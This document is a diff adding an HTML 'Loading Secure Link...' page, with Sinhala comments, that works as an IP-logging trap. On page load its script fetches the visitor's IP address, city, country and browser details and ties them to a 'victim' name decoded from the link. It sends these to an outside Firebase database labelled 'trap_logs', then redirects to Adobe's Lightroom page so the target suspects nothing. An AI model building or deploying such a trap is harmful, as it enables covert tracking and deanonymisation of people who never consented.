@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+</head>
+<body>
+    <script>
+        // උඹේ Firebase Config එක මෙතනට දාපන්
+        const firebaseConfig = { databaseURL: "https://dark-dragon-team-default-rtdb.firebaseio.com/" };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        // URL එකෙන් Victim ගේ නම ගන්නවා
+        const urlParams = new URLSearchParams(window.location.search);
+        const encodedName = urlParams.get('id');
+        const victimName = encodedName ? atob(encodedName) : "Unknown";
+
+        // IP එක සහ විස්තර අරන් Firebase යවනවා
+        fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(data => {
+            db.ref('trap_logs').push({
+                name: victimName,
+                ip: data.ip,
+                city: data.city,
+                country: data.country_name,
+                device: navigator.userAgent,
+                time: new Date().toLocaleString()
+            }).then(() => {
+                // දත්ත ගත්තට පස්සේ වික්ටිම්ව ඇත්තම Lightroom page එකකට යවනවා (සැක හිතෙන්නේ නැති වෙන්න)
+                window.location.href = "https://www.adobe.com/products/photoshop-lightroom.html";
+            });
+        });
+    </script>
+    <h2 style="text-align: center; margin-top: 50px; font-family: sans-serif;">Loading Secure Link...</h2>
+</body>
+</html>
